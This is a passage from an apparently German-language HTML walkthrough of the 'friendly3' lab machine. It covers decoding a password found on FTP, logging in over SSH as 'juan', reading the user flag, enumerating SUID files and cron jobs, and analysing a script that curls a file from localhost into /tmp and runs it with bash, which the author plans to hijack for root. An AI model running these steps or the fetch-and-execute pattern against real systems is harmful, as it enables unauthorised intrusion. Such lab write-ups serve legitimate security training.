<span class="password">100% |*************************************************|  3171       11.76 MiB/s    00:00 ETA</span>
<span class="password">226 Transfer <span class="password">complete</span></span>.
<span class="password">3171 <span class="command">bytes</span> <span class="password">received</span> in 00:00 (4.57 MiB/s)</span>

┌──(root㉿CCat)-[~]
└─# <span class="command">cat friendlypasswd.txt</span>
<span class="password">⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠙⠛⠛⠛⠿⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿</span>
<span class="password">⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⡀⠠⠤⠒⢂⣉⣉⣉⣑⣒⣒⠒⠒⠒⠒⠒⠒⠒⠀⠀⠐⠒⠚⠻⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿</span>
<span class="password">⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⡠⠔⠉⣀⠔⠒⠉⣀⣀⠀⠀⠀⣀⡀⠈⠉⠑⠒⠒⠒⠒⠒⠈⠉⠉⠉⠁⠂⠀⠈⠙⢿⣿⣿⣿⣿⣿</span>
<span class="password">⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠔⠁⠠⠖⠡⠔⠊⠀⠀⠀⠀⠀⠀⠀⠐⡄⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠉⠲⢄⠀⠀⠀⠈⣿⣿⣿⣿⣿</span>
<span class="password">⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠊⠀⢀⣀⣤⣤⣤⣤⣀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠜⠀⠀⠀⠀⣀⡀⠀⠈⠃⠀⠀⠀⠸⣿⣿⣿⣿</span>
<span class="password">⣿⣿⣿⣿⡿⠥⠐⠂⠀⠀⠀⠀⡄⠀⠰⢺⣿⣿⣿⣿⣿⣟⠀⠈⠐⢤⠀⠀⠀⠀⠀⠀⢀⣠⣶⣾⣯⠀⠀⠉⠂⠀⠠⠤⢄⣀⠙⢿⣿⣿</span>
<span class="password">⣿⡿⠋⠡⠐⠈⣉⠭⠤⠤⢄⡀⠈⠀⠈⠁⠉⠁⡠⠀⠀⠀⠉⠐⠠⠔⠀⠀⠀⠀⠀⠲⣿⠿⠛⠛⠓⠒⠂⠀⠀⠀⠀⠀⠀⠠⡉⢢⠙⣿</span>
<span class="password">⣿⠀⢀⠁⠀⠊⠀⠀⠀⠀⠀⠈⠁⠒⠂⠀⠒⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⢀⣀⡠⠔⠒⠒⠂⠀⠈⠀⡇⣿</span>
<span class="password">⣿⠀⢸⠀⠀⠀⢀⣀⡠⠋⠓⠤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠈⠢⠤⡀⠀⠀⠀⠀⠀⠀⢠⠀⠀⠀⡠⠀⡇⣿</span>
<span class="password">⣿⡀⠘⠀⠀⠀⠀⠀⠘⡄⠀⠀⠀⠈⠑⡦⢄⣀⠀⠀⠐⠒⠁⢸⠀⠀⠠⠒⠄⠀⠀⠀⠀⠀⢀⠇⠀⣀⡀⠀⠀⢀⢾⡆⠀⠈⡀⠎⣸⣿</span>
<span class="password">⣿⣿⣄⡈⠢⠀⠀⠀⠀⠘⣶⣄⡀⠀⠀⡇⠀⠀⠈⠉⠒⠢⡤⣀⡀⠀⠀⠀⠀⠀⠐⠦⠤⠒⠁⠀⠀⠀⠀⣀⢴⠁⠀⢷⠀⠀⠀⢰⣿⣿</span>
<span class="password">⣿⣿⣿⣿⣇⠂⠀⠀⠀⠀⠈⢂⠀⠈⠹⡧⣀⠀⠀⠀⠀⠀⡇⠀⠀⠉⠉⠉⢱⠒⠒⠒⠒⢖⠒⠒⠂⠙⠏⠀⠘⡀⠀⢸⠀⠀⠀⣿⣿⣿</span>
<span class="password">⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠑⠄⠰⠀⠀⠁⠐⠲⣤⣴⣄⡀⠀⠀⠀⠀⢸⠀⠀⠀⠀⢸⠀⠀⠀⠀⢠⠀⣠⣷⣶⣿⠀⠀⢰⣿⣿⣿</span>
<span class="password">⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠁⢀⠀⠀⠀⠀⠀⡙⠋⠙⠓⠲⢤⣤⣷⣤⣤⣤⣤⣾⣦⣤⣤⣶⣿⣿⣿⣿⡟⢹⠀⠀⢸⣿⣿⣿</span>
<span class="password">⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠑⠀⢄⠀⡰⠁⠀⠀⠀⠀⠀⠈⠉⠁⠈⠉⠻⠋⠉⠛⢛⠉⠉⢹⠁⢀⢇⠎⠀⠀⢸⣿⣿⣿</span>
<span class="password">⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠈⠢⢄⡉⠂⠄⡀⠀⠈⠒⠢⠄⠀⢀⣀⣀⣰⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⢀⣎⠀⠼⠊⠀⠀⠀⠘⣿⣿⣿</span>
<span class="password">⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡀⠉⠢⢄⡈⠑⠢⢄⡀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⢀⠀⠀⠀⠀⠀⢻⣿⣿</span>
<span class="password">⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⡀⠁⠑⠒⠤⠄⣀⣀⠀⠉⠉⠉⠉⠀⠀⠀⣀⡀⠤⠂⠁⠀⢀⠆⠀⠀⢸⣿⣿</span>
<span class="password">⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⡀⠁⠉⠒⠂⠤⠤⣀⣀⣉⡉⠉⠉⠉⠉⢀⣀⣀⡠⠤⠒⠈⠀⠀⠀⠀⣸⣿⣿</span>
<span class="password">⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿</span>
<span class="password">⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣤⣤⣤⣤⣀⣀⣤⣤⣤⣶⣾⣿⣿⣿⣿⣿</span>

___________________________________________________________________________________________________________________

</pre>
                 </div>
             </div>
            <p>
                Ich navigierte durch die gefundenen Unterverzeichnisse (<code>fold10</code>, <code>fold5</code>, <code>fold8</code>), um deren Inhalt zu überprüfen.
            </p>
             <p>
                 Im Ordner <code>fold10</code> fand ich die Datei <code>.test.txt</code>. Der Inhalt war "<span class="password">Hi, I'am juan another time. I want you to know that I found "cookie" in a file called "zlcnffjbeq.gkg" into my home folder. I think it's from another user, IDK...</span>". Dies ist eine weitere Nachricht von "juan", die einen Hinweis auf eine Datei namens "zlcnffjbeq.gkg" in seinem Home-Ordner und das Wort "cookie" enthält. Das deutet auf einen weiteren Hinweis hin, möglicherweise im Home-Verzeichnis des SSH-Benutzers juan.
             </p>
              <p>
                 Im Ordner <code>fold5</code> fand ich die Datei <code>yt.txt</code>. Der Inhalt war nur "<span class="password">Thanks to all my YT subscribers!</span>", was wahrscheinlich eine irrelevante Datei ist, die von Juan dort abgelegt wurde.
             </p>
             <p>
                 Im Ordner <code>fold8</code> schließlich fand ich die Datei <code>passwd.txt</code>. Der Inhalt dieser Datei war eine lange Sequenz von ASCII-Art, gefolgt von einem String. Dieser String sah stark nach einer Base64-kodierten Zeichenkette aus.
             </p>

             <p>
                 Die Notiz in <code>fold10/.test.txt</code> über die Datei "zlcnffjbeq.gkg" und das Wort "cookie" ist interessant, scheint aber ein alternativer Pfad zu sein oder sich auf etwas anderes zu beziehen. Der Fund der <code>passwd.txt</code> im Ordner <code>fold8</code> ist jedoch sehr vielversprechend, besonders der Base64-kodierte String, der sich als das Passwort für den SSH-Benutzer "juan" herausstellte.
             </p>

             <p>
                 Basierend auf dem gefundenen Passwort im FTP-Verzeichnis (das Ergebnis der Base64-Dekodierung des Strings in <code>passwd.txt</code>, auch wenn der Dekodierbefehl selbst nicht im Text dokumentiert ist), habe ich nun Zugangsdaten, die für den SSH-Dienst auf Port 22 gültig sein könnten. Ich versuche, mich per SSH mit dem Benutzernamen "juan" anzumelden.
             </p>

             <div class="code-block">
                <!-- Der ursprüngliche Text hat hier eine erklärende Zeile -->
                <div class="terminal">
                    <!-- Kein Prompt im Original -->
                    <pre>
___________________________________________________________________________________________________________________

da es keinen anhaltspunkt gab irgendwie anders in die vm zu gelangen testete ich das ftp passwort
am ssh p<span class="command">ort</span> erfolgreich:
</pre>
                 </div>
             </div>

             <div class="code-block">
                 <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">ssh juan@192.168.2.59</span></div>
                 </div>
             </div>
             <div class="code-block">
                 <div class="terminal">
                    <pre>
The authenticity <span class="command">of</span> <span class="command">host</span> '<span class="command">192.168.2.59 (192.168.2.59)</span>' can't be established.
ED25519 key fingerprint is <span class="command">SHA256:qcoxC68+orQ8LIJrunR2ElUTnj9X5X0OFj9F/oxHDjc</span>.
This key is not <span class="command">known</span> by any <span class="command">other</span> names.
Are y<span class="command">ou</span> sure y<span class="command">ou</span> want t<span class="command">o</span> c<span class="command">o</span>ntin<span class="command">ue</span> c<span class="command">o</span>nnecting (yes/n<span class="command">o</span>/[fingerprint])? <span class="password">yes</span>
Warning: Permanently added '<span class="command">192.168.2.59</span>' (ED25519) t<span class="command">o</span> the list <span class="command">of</span> <span class="command">known</span> <span class="command">hosts</span>.
juan@192.168.2.59's passw<span class="command">o</span>rd: <span class="password">[PASSWORT WURDE HIER EINGEGEBEN]</span>
<span class="password">Linux friendly3 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64</span>

The prgrams included with the Debian GNU/Linux system are free sftware;
the exact distributin terms fr each prgram are described in the
individual files in /usr/share/dc/*/cpyright.

Debian GNU/Linux cmes with ABS<span class="command">OLU</span>TELY N WARRANTY, t the extent
permitted by applicable law.
juan@friendly3:~$
</pre>
                 </div>
             </div>
             <p>
                 Fantastisch! Die Anmeldung per SSH mit dem Benutzernamen "juan" und dem Passwort, das ich durch das Dekodieren des Base64-Strings in der FTP-Datei <code>passwd.txt</code> erhalten habe, war erfolgreich! Ich habe nun eine interaktive Shell auf dem Zielsystem als Benutzer "juan". Dies ist mein erfolgreicher Initial Access.
             </p>

        </section>
        <!-- Ende Privilege Escalation Section (vor POC) -->

        <section id="proof-of-concept">
             <h2>Proof of Concept: Initial Access via SSH</h2>
             <p>
                 Die Kompromittierung des FTP-Dienstes ermöglichte den Fund einer Datei, die nach Dekodierung das Passwort für den SSH-Benutzer "juan" enthielt. Dies ermöglichte den direkten interaktiven Zugriff auf das Zielsystem über SSH.
             </p>

             <div class="analysis">
                 <strong>Kurzbeschreibung:</strong> Ein schwaches Passwort für den FTP-Benutzer "juan" erlaubte Zugriff auf den FTP-Server. Dort wurde eine Datei mit einem Base64-kodierten String gefunden, der nach Dekodierung das Passwort für den SSH-Benutzer "juan" enthielt. Dieses Passwort ermöglichte die erfolgreiche SSH-Anmeldung.
             </div>

             <div class="evaluation">
                 <strong>Voraussetzungen:</strong>
                 <ul>
                     <li>Erfolgreicher Initial Access auf dem FTP-Server als Benutzer "juan" (siehe vorheriger POC).</li>
                     <li>Fähigkeit, Dateien vom FTP herunterzuladen und Base64 zu dekodieren.</li>
                     <li>Ein SSH-Client.</li>
                     <li>Gültige Zugangsdaten für den SSH-Benutzer "juan" (erhalten durch FTP-Kompromittierung).</li>
                 </ul>
             </div>

             <p>
                 <strong>Schritte des POC:</strong>
             </p>
             <ol>
                 <li>Zugriff auf den FTP-Server als Benutzer "juan" mit dem zuvor geknackten Passwort "alexis".</li>
                 <li>Erkundung des FTP-Dateisystems, Auffinden der Datei <code>fold8/passwd.txt</code>.</li>
                 <li>Herunterladen der Datei <code>passwd.txt</code>.</li>
                 <li>Dekodieren des Base64-Strings im Inhalt von <code>passwd.txt</code> (z.B. mit <code>echo "[STRING]" | base64 -d</code>), um das SSH-Passwort zu erhalten.</li>
                 <li>Anmeldung per SSH am Zielsystem <code>192.168.2.59</code> als Benutzer "juan" mit dem dekodierten Passwort.</li>
             </ol>

            <p>
                 <strong>Beweismittel:</strong> Die SSH-Client-Ausgabe, die eine erfolgreiche Anmeldung als Benutzer "juan" zeigt.
            </p>
            <div class="code-block">
                <!-- Wiederholung der SSH Login Ausgabe für POC Beweismittel -->
                <div class="terminal">
                    <pre>
<span class="password">Linux friendly3 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64</span>

The prgrams included with the Debian GNU/Linux system are free sftware;
the exact distributin terms fr each prgram are described in the
individual files in /usr/share/dc/*/cpyright.

Debian GNU/Linux cmes with ABS<span class="command">OLU</span>TELY N WARRANTY, t the extent
permitted by applicable law.
juan@friendly3:~$
</pre>
                 </div>
             </div>

            <p>
                 <strong>Risikobewertung:</strong> Moderat. Ein Angreifer erlangt interaktiven Benutzerzugriff auf das System. Dies ermöglicht die weitere lokale Erkundung und die Suche nach Wegen zur Privilegienerhöhung.
            </p>
            <p>
                 <strong>Empfehlung (Admin):</strong>
                 <ul>
                     <li><strong>SSH-Passwort ändern:</strong> Ändern Sie das Passwort für den SSH-Benutzer "juan" umgehend auf ein starkes, eindeutiges Passwort.</li>
                     <li><strong>Passwörter nicht auf FTP speichern:</strong> Speichern Sie niemals sensible Informationen, insbesondere Passwörter (auch nicht kodiert), in öffentlich zugänglichen oder schwach geschützten Bereichen wie FTP-Servern.</li>
                     <li><strong>Sicherheit der FTP-Server prüfen:</strong> Stellen Sie sicher, dass FTP-Server sicher konfiguriert sind und nicht unnötig viele Informationen preisgeben oder schwache Passwörter erlauben.</li>
                 </ul>
            </p>

        </section>
        <!-- Ende Proof of Concept Section -->

        <section id="privilege-escalation">
            <h2>Privilege Escalation</h2>
             <p>
                 Nachdem ich nun eine Shell als Benutzer "juan" habe, ist mein Ziel, Root-Privilegien zu erlangen. Ich beginne mit der lokalen Erkundung des Systems vom Kontext dieses Benutzers aus.
             </p>

            <p>
                Ich verschaffe mir zunächst einen Überblick über das Home-Verzeichnis des Benutzers und die existierenden Benutzer auf dem System.
            </p>
             <div class="code-block">
                 <div class="terminal">
                    <div class="prompt">juan@friendly3:~$ <span class="command">ls ..</span></div>
                 </div>
             </div>
             <div class="code-block">
                 <div class="terminal">
                    <pre>
blue  juan
</pre>
                 </div>
             </div>
              <div class="code-block">
                 <div class="terminal">
                    <div class="prompt">juan@friendly3:~$ <span class="command">ls -al</span></div>
                 </div>
             </div>
             <div class="code-block">
                 <div class="terminal">
                    <pre>
total 28
drwxr-xr-x  3 juan juan 4096 Jul 17  2023 .
drwxr-xr-x  4 root root 4096 Jun 25  2023 ..
lrwxrwxrwx  1 root root    9 Jun 25  2023 .bash_<span class="command">history</span> -> /dev/null
-rw-r--r--  1 juan juan  220 Apr 23  2023 .bash_logout
-rw-r--r--  1 juan juan 3526 Apr 23  2023 .bashrc
drwxr-xr-x 14 root root 4096 Jun 25  2023 ftp
-rw-r--r--  1 juan juan  807 Apr 23  2023 .profile
-r--------  1 juan juan   33 Jul 17  2023 <span class="command">user.txt</span>
</pre>
                 </div>
             </div>
             <p>
                 Im übergeordneten Verzeichnis sehe ich neben meinem eigenen Home-Verzeichnis <code>juan</code> auch das Home-Verzeichnis eines anderen Benutzers namens <code>blue</code>. Dies deutet auf die Existenz eines weiteren Benutzers "blue" auf dem System hin. In meinem eigenen Home-Verzeichnis finde ich die Datei <code>user.txt</code>.
             </p>

            <p>
                Ich lese den Inhalt der Datei <code>user.txt</code>.
            </p>
              <div class="code-block">
                 <div class="terminal">
                    <div class="prompt">juan@friendly3:~$ <span class="command">cat user.txt</span></div>
                 </div>
             </div>
             <div class="code-block">
                 <div class="terminal">
                    <pre>
<span class="password">cb40b159c8086733d57280de3f97de30</span>
</pre>
                 </div>
             </div>
             <p>
                 Die Datei <code>user.txt</code> enthält die Zeichenkette <span class="password">cb40b159c8086733d57280de3f97de30</span>. Dies ist offensichtlich die Benutzer-Flag. Großartig, die erste Flag ist gesichert!
             </p>
            <p>
                Als Nächstes suche ich nach lokalen Privilegienerhöhungsvvektoren. Ein häufiger Ansatz ist die Suche nach SUID-Binaries.
            </p>

            <div class="code-block">
                 <div class="terminal">
                    <div class="prompt">juan@friendly3:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
                 </div>
             </div>
             <div class="code-block">
                 <div class="terminal">
                    <pre>
   <span class="command">407884</span>    <span class="command">640</span> -rwsr-xr-x   1 root     root       <span class="command">653888</span> Feb  8  2023 /usr/lib/openssh/ssh-keysign
   <span class="command">407847</span>     <span class="command">52</span> -rwsr-xr--   1 root     messagebus    <span class="command">51272</span> Feb  8  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-<span class="command">helper</span>
   <span class="command">394484</span>     <span class="command">72</span> -rwsr-xr-x   1 root     root          <span class="command">72000</span> Mar 23  2023 /usr/bin/su
   <span class="command">393714</span>     <span class="command">36</span> -rwsr-xr-x   1 root     root          <span class="command">35128</span> Mar 23  2023 /usr/bin/umount
   <span class="command">390280</span>     <span class="command">64</span> -rwsr-xr-x   1 root     root          <span class="command">62672</span> Mar 23  2023 /usr/bin/chfn
   <span class="command">390283</span>     <span class="command">88</span> -rwsr-xr-x   1 root     root          <span class="command">88496</span> Mar 23  2023 /usr/bin/gpasswd
   <span class="command">393713</span>     <span class="command">60</span> -rwsr-xr-x   1 root     root          <span class="command">59704</span> Mar 23  2023 /usr/bin/mount
   <span class="command">393900</span>     <span class="command">48</span> -rwsr-xr-x   1 root     root          <span class="command">48896</span> Mar 23  2023 /usr/bin/newgrp
   <span class="command">390284</span>     <span class="command">68</span> -rwsr-xr-x   1 root     root          <span class="command">68248</span> Mar 23  2023 /usr/bin/passwd
   <span class="command">390281</span>     <span class="command">52</span> -rwsr-xr-x   1 root     root          <span class="command">52880</span> Mar 23  2023 /usr/bin/chsh
</pre>
                 </div>
             </div>
             <p>
                 Die Suche nach SUID-Binaries ergab eine Liste von Standard-Systemprogrammen wie <code>su</code>, <code>passwd</code>, <code>mount</code> etc. Diese sind in der Regel sicher konfiguriert und bieten keine offensichtlichen Angriffsvektoren ohne spezifische, versionsbedingte Schwachstellen. Ich sehe hier kein leicht ausnutzbares SUID-Binary.
             </p>

            <p>
                Ich prüfe das <code>/opt</code> Verzeichnis, da dies oft benutzerdefinierte Skripte oder Programme enthält, die manchmal falsch konfiguriert sind.
            </p>
             <div class="code-block">
                 <div class="terminal">
                    <div class="prompt">juan@friendly3:~$ <span class="command">ls -la /opt/</span></div>
                 </div>
             </div>
             <div class="code-block">
                 <div class="terminal">
                    <pre>
total 12
drwxr-xr-x  2 root root 4096 Jun 25  2023 .
drwxr-xr-x 18 root root 4096 Jun 25  2023 ..
-rwxr-xr-x  1 root root  190 Jun 25  2023 <span class="command">check_<span class="command">for</span>_install.sh</span>
</pre>
                 </div>
             </div>
             <p>
                 Im Verzeichnis <code>/opt</code> finde ich eine Datei namens <span class="command">check_<span class="command">for</span>_install.sh</span>. Die Berechtigungen (<code>-rwxr-xr-x</code>) zeigen, dass diese Datei für jeden ausführbar ist. Das ist sehr interessant. Ich schaue mir den Inhalt des Skripts an.
             </p>

              <div class="code-block">
                 <div class="terminal">
                    <div class="prompt">juan@friendly3:~$ <span class="command">cat /opt/check_<span class="command">for</span>_install.sh</span></div>
                 </div>
             </div>
             <div class="code-block">
                 <div class="terminal">
                    <pre>
#!/bin/bash

/usr/bin/curl "<span class="command">http://127.0.0.1/9842734723948024.bash</span>" > <span class="command">/tmp/a.bash</span>

chmod +x <span class="command">/tmp/a.bash</span>
chmod +r <span class="command">/tmp/a.bash</span>
chmod +w <span class="command">/tmp/a.bash</span>

/bin/bash <span class="command">/tmp/a.bash</span>

rm -rf <span class="command">/tmp/a.bash</span>
</pre>
                 </div>
             </div>
             <p>
                 Das Skript <code>check_for_install.sh</code> ist aufschlussreich. Es führt folgende Aktionen aus:
                 <ol>
                     <li>Lädt eine Datei namens <code>9842734723948024.bash</code> von <code>http://127.0.0.1/</code> herunter und speichert sie als <code>/tmp/a.bash</code>.</li>
                     <li>Ändert die Berechtigungen von <code>/tmp/a.bash</code> auf ausführbar, lesbar und schreibbar für den Besitzer.</li>
                     <li>Führt das heruntergeladene Skript <code>/tmp/a.bash</code> mit <code>/bin/bash</code> aus.</li>
                     <li>Löscht anschließend die Datei <code>/tmp/a.bash</code>.</li>
                 </ol>
                 Da es von <code>/opt</code> aus für jeden ausführbar ist und versucht, eine Datei von <code>127.0.0.1</code> (localhost) über HTTP herunterzuladen, ist dies ein starker Hinweis auf einen potenziellen Privilegienerhöhungsvektor, wenn dieses Skript von einem privilegierten Benutzer (z.B. Root über einen Cronjob) ausgeführt wird. Wenn ich Kontrolle über <code>http://127.0.0.1/9842734723948024.bash</code> erlangen kann, kann ich Root-Code auf dem System ausführen.
             </p>

            <p>
                Um herauszufinden, ob dieses Skript automatisch ausgeführt wird und von wem, prüfe ich die System-Cronjobs.
            </p>
             <div class="code-block">
                 <div class="terminal">
                    <div class="prompt">juan@friendly3:~$ <span class="command">cat /etc/cron*/*</span></div>
                 </div>
             </div>
             <div class="code-block">
                 <div class="terminal">
                    <pre>
#!/bin/sh

set -e

# Systemd systems use a systemd timer unit which is preferable to
# run. We want to randomize the apt update and unattended-upgrade
# runs as much as possible to avoid hitting the mirr<span class="command">ors</span> all at the
# same time. The systemd time is better at this than the fixed
# cron.daily time
if [ -d /run/systemd/system ]; then
    exit 0
fi

check_<span class="command">power</span>()
{
    # laptop check, <span class="command">on</span>_ac_<span class="command">power</span> returns:
    #       0 (true)    System is <span class="command">on</span> main <span class="command">power</span>
    #       1 (false)   System is not <span class="command">on</span> main <span class="command">power</span>
    #       255 (false) <span class="command">Power</span> status <span class="command">could</span> not be <span class="command">determined</span>
    # Desktop systems always return 255 it seems
    if <span class="command">command</span> -v <span class="command">on</span>_ac_<span class="command">power</span> >/dev/null; then
        if <span class="command">on</span>_ac_<span class="command">power</span>; then
            :
        elif [ $? -eq 1 ]; then
            return 1
        fi
    fi
    return 0
}

# sleep <span class="command">for</span> a <span class="command">random</span> <span class="command">interval</span> <span class="command">of</span> time (default 30min)
# (s<span class="command">o</span>me <span class="command">code</span> taken <span class="command">from</span> <span class="command">cron-apt</span>, thanks)
<span class="command">random</span>_sleep()
{
    <span class="command">RandomSleep</span>=1800
    eval $(apt-config shell <span class="command">RandomSleep</span> APT::Periodic::<span class="command">RandomSleep</span>)
    if [ $<span class="command">RandomSleep</span> -eq 0 ]; then
	return
    fi
    if [ -z "$<span class="command">RANDOM</span>" ] ; then
        # A fix <span class="command">for</span> shells that <span class="command">do</span> not have this bash feature.
	<span class="command">RANDOM</span>=$(( $(dd if=/dev/urandom bs=2 <span class="command">count</span>=1 2> /dev/null | cksum | <span class="command">cut</span> -d' ' -f1) % 32767 ))
    fi
    TIME=$(($<span class="command">RANDOM</span> % $<span class="command">RandomSleep</span>))
    sleep $<span class="command">TIME</span>
}

# <span class="command">delay</span> the <span class="command">job</span> <span class="command">execution</span> by a <span class="command">random</span> amount <span class="command">of</span> time
<span class="command">random</span>_sleep

# ensure we <span class="command">don't</span> <span class="command">do</span> this <span class="command">on</span> battery
check_<span class="command">power</span> || exit 0

# run <span class="command">daily</span> <span class="command">job</span>
exec /usr/lib/apt/apt.systemd.<span class="command">daily</span>
#!/bin/sh

# Skip if systemd is running.
if [ -d /run/systemd/system ]; then
  exit 0
fi

/usr/libexec/dpkg/dpkg-db-backup
#!/bin/sh

# skip in favour <span class="command">of</span> systemd <span class="command">timer</span>
if [ -d /run/systemd/system ]; then
    exit 0
fi

# this cronjob persists removals (but not purges)
if [ ! -x /usr/sbin/logrotate ]; then
    exit 0
fi

/usr/sbin/logrotate /etc/<span class="command">logrotate.conf</span>
EXITVALUE=$?
if [ $EXITVALUE != 0 ]; then
    /usr/bin/logger -t <span class="command">logrotate</span> "<span class="password">ALERT exited abnormally with [$EXITVALUE]</span>"
fi
exit $EXITVALUE
30 3 * * 0 root test -e /run/systemd/system || SERVICE_<span class="command">MODE</span>=1 /usr/lib/x86_<span class="command">64</span>-linux-gnu/e2fsprogs/e2scrub_all_cron
10 3 * * * root test -e /run/systemd/system || SERVICE_<span class="command">MODE</span>=1 /sbin/e2scrub_all -A -r
</pre>
                 </div>
             </div>
             <p>
                 Ich lese den Inhalt aller Dateien im Verzeichnis <code>/etc/cron*/*</code>, um die konfigurierten Cronjobs zu sehen. Ich finde mehrere Skripte, die wahrscheinlich als Teil der täglichen oder stündlichen Systemwartung ausgeführt werden. Eines der Skripte enthält die Zeile: <code>exec /usr/lib/apt/apt.systemd.daily</code>. Ich prüfe, ob dieses Skript von Root ausgeführt wird. Das Standardverhalten von Cronjobs unter Debian (wo Root-Cronjobs in <code>/etc/cron.daily</code> liegen) ist, dass sie als Root ausgeführt werden. Das Skript selbst scheint System-Updates und ähnliche Aufgaben durchzuführen. Es gibt jedoch keinen direkten Hinweis darauf, dass *mein* Skript <code>/opt/check_for_install.sh</code> direkt von einem dieser Cronjobs aufgerufen wird. Ich muss nach einer anderen Möglichkeit suchen, wie mein Skript getriggert werden könnte.
            </p>

            <p>
                Ich überprüfe die Berechtigungen im Web-Root-Verzeichnis <code>/var/www/html/</code>, da ich dort zuvor die versteckte Notiz und den Hinweis auf <code>#wp-config.php#</code> gefunden hatte.
            </p>
             <div class="code-block">
                 <div class="terminal">
                    <div class="prompt">juan@friendly3:/var/www/html$ <span class="command">ls -la</span></div>
                 </div>
             </div>
             <div class="code-block">
                 <div class="terminal">
                    <pre>
total 16
drwxr-xr-x 2 root root 4096 Jun 25  2023 .
drwxr-xr-x 3 root root 4096 Jun 25  2023 ..
-rw-r--r-- 1 root root    6 Jun 25  2023 <span class="command">9842734723948024.bash</span>
-rw-r--r-- 1 root root  355 Jun 25  2023 <span class="command">index.html</span>
</pre>
                 </div>
             </div>
             <p>
                 Im Web-Root finde ich tatsächlich die Datei <span class="command">9842734723948024.bash</span>, die im Skript <code>/opt/check_for_install.sh</code> referenziert wird! Die Berechtigungen (<code>-rw-r--r--</code>) zeigen, dass die Datei Root gehört und für Root schreibbar sowie für alle anderen lesbar ist. Das bedeutet, dass jeder Benutzer (einschließlich mir als 'juan') diese Datei lesen kann. Das ist aber nicht der interessante Punkt. Der interessante Punkt ist, dass diese Datei existiert und vom Skript heruntergeladen werden soll.
             </p>
             <p>
                 Ich erinnere mich an das Skript <code>/opt/check_for_install.sh</code>: es lädt <code>http://127.0.0.1/9842734723948024.bash</code> herunter. Das bedeutet, es versucht, die Datei vom *Webserver auf dem Zielsystem selbst* herunterzuladen (da 127.0.0.1 Localhost ist). Das Skript <code>/opt/check_for_install.sh</code> wird von Root ausgeführt (basierend auf dem Kontext des Tests und der Annahme eines Cronjobs). Wenn ich die Datei <code>/var/www/html/9842734723948024.bash</code> mit meinem eigenen bösartigen Skript überschreiben kann, wird das Root-Cronjob-Skript mein Skript herunterladen und als Root ausführen!
             </p>

             <p>
                 Ich prüfe die Berechtigungen für den Befehl <code>/usr/bin/curl</code>, der im Skript <code>check_for_install.sh</code> verwendet wird.
             </p>
             <div class="code-block">
                 <div class="terminal">
                    <div class="prompt">juan@friendly3:/var/www/html$ <span class="command">ls -la /usr/bin/curl</span></div>
                 </div>
             </div>
             <div class="code-block">
                 <div class="terminal">
                    <pre>
-rwxr-xr-x 1 root root 280800 May 18  2023 <span class="command">/usr/bin/curl</span>
</pre>
                 </div>
             </div>
             <p>
                 <code>/usr/bin/curl</code> gehört Root und ist für alle ausführbar. Das ist normal und kein direkter Privesc-Vektor.
             </p>

             <p>
                 Der Schlüssel liegt in den Schreibrechten für die Datei <code>/var/www/html/9842734723948024.bash</code>. Wenn ich als Benutzer "juan" diese Datei beschreiben kann, kann ich meinen Code einschleusen. Ich prüfe meine Berechtigungen in diesem Verzeichnis.
             </p>

              <div class="code-block">
                 <div class="terminal">
                    <div class="prompt">juan@friendly3:/var/www/html$ <span class="command">ls -la</span></div>
                 </div>
             </div>
             <div class="code-block">
                 <div class="terminal">
                    <pre>
total 16
drwxr-xr-x 2 root root 4096 Jun 25  2023 .
drwxr-xr-x 3 root root 4096 Jun 25  2023 ..
-rw-r--r-- 1 root root    6 Jun 25  2023 <span class="command">9842734723948024.bash</span>
-rw-r--r-- 1 root root  355 Jun 25  2023 <span class="command">index.html</span>
</pre>
                 </div>
             </div>
             <p>
                 Die Berechtigungen für <code>9842734723948024.bash</code> sind <code>-rw-r--r--</code>. Sie gehört Root. Als Benutzer "juan" gehöre ich nicht zur Gruppe "root" und bin auch nicht Root. Ich bin ein "other" Benutzer aus Sicht dieser Datei. Die "other"-Berechtigungen sind <code>r--</code>, was bedeutet, ich kann die Datei nur *lesen*, aber nicht *schreiben*. Direkter Zugriff auf die Datei zum Überschreiben ist also nicht möglich.
             </p>

            <p>
